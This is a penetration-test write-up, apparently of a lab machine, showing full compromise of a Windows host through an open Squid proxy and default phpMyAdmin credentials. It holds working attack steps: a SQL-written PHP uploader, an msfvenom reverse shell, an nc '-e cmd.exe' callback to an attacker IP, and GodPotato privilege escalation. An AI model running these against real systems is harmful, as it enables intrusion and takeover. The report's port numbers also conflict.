# Report - Squid
Author: Henry Post
Target: SQUID
Target IP: 192.168.53.189
Date: 04/03/2026

# Executive Summary

This machine, Squid, was enumerated by `nmap` to have a Squid proxy at port 3182 open.

When connecting over the proxy, a PHPMyAdmin instance was running.

Default credentials were used to login to PHPMyAdmin.

From there, a PHP reverse shell and uploader tool were created on the victim using MySQL code to write to files.

Non-SYSTEM access was obtained, and `GodPotato.exe`, a tool which escalates privileges, along with `FullPowers.exe` were used to obtain SYSTEM level access.

## Recommendations

Do not leave proxies open. Require authentication for proxy connections with a strong password.

Do not leave default credentials configured on PHPMyAdmin. Use a strong password or key-based auth.

Update Windows so it is not vulnerable to `GodPotato.exe`.

Disable the print spooler service if it is not needed..

# Recon

`nmap -sV -sC -T4 -oA initial 192.168.53.189` was used. We discover Squid proxy.

![](Pasted%20image%2020260403144055.png)

```
???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial 192.168.53.189
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-03 19:39 +0000
Nmap scan report for 192.168.53.189
Host is up (0.00052s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-server-header: squid/4.14
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-03T19:39:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.46 seconds
```

# Non-SYSTEM access

We use FoxyProxy to access `http://192.168.53.189:8080`.

![](Pasted%20image%2020260403144759.png)

It shows a PHPMyAdmin control panel.

![](Pasted%20image%2020260403144140.png)

We try `root:<BLANK>` as credentials for PHPMyAdmin, and we get in.

![](Pasted%20image%2020260403144156.png)

![](Pasted%20image%2020260403144208.png)

We also go to `phpinfo` page and see the document root is `C:\wamp\www\`.

![](Pasted%20image%2020260403144351.png)

We then go to "SQL" panel in PHPMyAdmin, where we set up an upload utility and a reverse shell.

```sh
msfvenom -p php/reverse_php LHOST=192.168.49.53 LPORT=4444 -f raw > shell.php
```

![](Pasted%20image%2020260403144537.png)

We create the upload utility file.

```sql
SELECT   
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

![](Pasted%20image%2020260403144605.png)

We upload our reverse shell.

![](Pasted%20image%2020260403144650.png)

We start a `nc` listener on port `4444` to get non-root access.

```
nc -nvlp 4444
```

We visit `http://192.168.53.189:8080/shell.php` to trigger a connection to the attacker.

![](Pasted%20image%2020260403144900.png)

# SYSTEM access

We query the dotnet version.

```sh
# on victim, to find .net version
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s
```

![](Pasted%20image%2020260403145021.png)

It is Dotnet `4.x`.

We go back to our `uploader.php` page and upload a few useful binaries:

```sh
# on attacker, then upload
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
cp GodPotato-NET4.exe GodPotato.exe
file GodPotato.exe

wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
file FullPowers.exe

wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
file nc.exe
```

![](Pasted%20image%2020260403145118.png)

We go back to our victim reverse shell. We note the binaries exist.

![](Pasted%20image%2020260403145205.png)

We start a new reverse shell listener on the attacker at port `5555`.

```
nc -nvlp 5555
```

We run this on the victim:

```
copy C:\wamp\www\nc.exe C:\Windows\Temp\nc.exe
FullPowers.exe
GodPotato.exe -cmd "C:\Windows\Temp\nc.exe 192.168.49.53 5555 -e cmd.exe"
```

![](Pasted%20image%2020260403145435.png)

And our second reverse shell now has SYSTEM access.

![](Pasted%20image%2020260403145507.png)

